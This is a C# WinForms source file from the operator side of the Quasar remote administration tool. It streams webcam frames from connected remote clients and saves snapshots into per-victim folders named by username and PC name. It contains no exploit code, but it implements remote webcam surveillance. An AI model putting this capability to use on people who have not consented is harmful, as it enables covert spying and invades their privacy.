using Quasar.Common.Messages;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmRemoteWebcamAsync : Form
    {
        private readonly Client _connectClient;

        private readonly RemoteWebcamAsyncHandler _handler;

        private static readonly Dictionary<Client, FrmRemoteWebcamAsync> OpenedForms = new Dictionary<Client, FrmRemoteWebcamAsync>();

        public static FrmRemoteWebcamAsync CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmRemoteWebcamAsync f = new FrmRemoteWebcamAsync(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmRemoteWebcamAsync(Client client)
        {
            _connectClient = client;
            _handler = new RemoteWebcamAsyncHandler(client);

            RegisterMessageHandler();
            InitializeComponent();
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _handler.WebcamsChanged += WebcamsChanged;
            _handler.ProgressChanged += UpdateFrame;
            _handler.StatusChanged += OnStatusChanged;
            MessageHandler.Register(_handler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_handler);
            _handler.WebcamsChanged -= WebcamsChanged;
            _handler.ProgressChanged -= UpdateFrame;
            _handler.StatusChanged -= OnStatusChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void OnStatusChanged(object sender, string statusText)
        {
            if (lblStatus.InvokeRequired)
            {
                lblStatus.Invoke((MethodInvoker)(() => lblStatus.Text = statusText));
            }
            else
            {
                lblStatus.Text = statusText;
            }
        }

        private void WebcamsChanged(object sender, string[] webcamNames)
        {
            cbWebcams.Items.Clear();
            foreach (string name in webcamNames)
            {
                cbWebcams.Items.Add(name);
            }
            if (cbWebcams.Items.Count > 0)
                cbWebcams.SelectedIndex = 0;

            lblStatus.Text = cbWebcams.Items.Count > 0
                ? $"{cbWebcams.Items.Count} webcam(s) found"
                : "No webcams found";
        }

        private void UpdateFrame(object sender, Bitmap bmp)
        {
            try
            {
                var oldImage = picWebcam.Image;
                picWebcam.Image = new Bitmap(bmp, picWebcam.Size);
                oldImage?.Dispose();
                bmp.Dispose();
            }
            catch (Exception)
            {
                bmp?.Dispose();
            }
        }

        private void FrmRemoteWebcamAsync_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Webcam (Async)", _connectClient);
            barQuality.Value = 75;
            barQuality_Scroll(sender, e);
            _handler.RefreshWebcams();
        }

        private void FrmRemoteWebcamAsync_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_handler.IsStarted)
                StopStream();
            UnregisterMessageHandler();
            _handler.Dispose();
            picWebcam.Image?.Dispose();
        }

        private void FrmRemoteWebcamAsync_Resize(object sender, EventArgs e)
        {
            panelTop.Left = (this.ClientSize.Width - panelTop.Width) / 2;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbWebcams.Items.Count == 0)
            {
                MessageBox.Show("No remote webcam detected.\nPlease wait till the client sends a list with available webcams.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            StartStream();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            StopStream();
        }

        private void StartStream()
        {
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            cbWebcams.Enabled = false;
            barQuality.Enabled = false;
            btnCapture.Enabled = true;
            lblStatus.Text = "Initializing camera (DirectShow)...";

            _handler.BeginReceiveFrames(cbWebcams.SelectedIndex, barQuality.Value);
        }

        private void StopStream()
        {
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            cbWebcams.Enabled = true;
            barQuality.Enabled = true;
            btnCapture.Enabled = false;
            lblStatus.Text = "Stopped";

            _handler.EndReceiveFrames();
        }

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            lblStatus.Text = "Refreshing...";
            _handler.RefreshWebcams();
        }

        private void btnCapture_Click(object sender, EventArgs e)
        {
            if (picWebcam.Image == null)
            {
                MessageBox.Show("No webcam frame available to capture.",
                    "Capture failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            try
            {
                string clientFolder = Path.Combine(
                    Application.StartupPath,
                    "Clients",
                    string.Format("{0}@{1}", _connectClient.Value.Username, _connectClient.Value.PcName));

                string capturesFolder = Path.Combine(clientFolder, "Captures");

                if (!Directory.Exists(capturesFolder))
                    Directory.CreateDirectory(capturesFolder);

                string fileName = string.Format("WebcamAsync_{0}.png",
                    DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss"));

                string filePath = Path.Combine(capturesFolder, fileName);

                using (var bmp = new Bitmap(picWebcam.Image))
                {
                    bmp.Save(filePath, ImageFormat.Png);
                }

                lblStatus.Text = $"Captured: {fileName}";
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to save capture: " + ex.Message,
                    "Capture failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
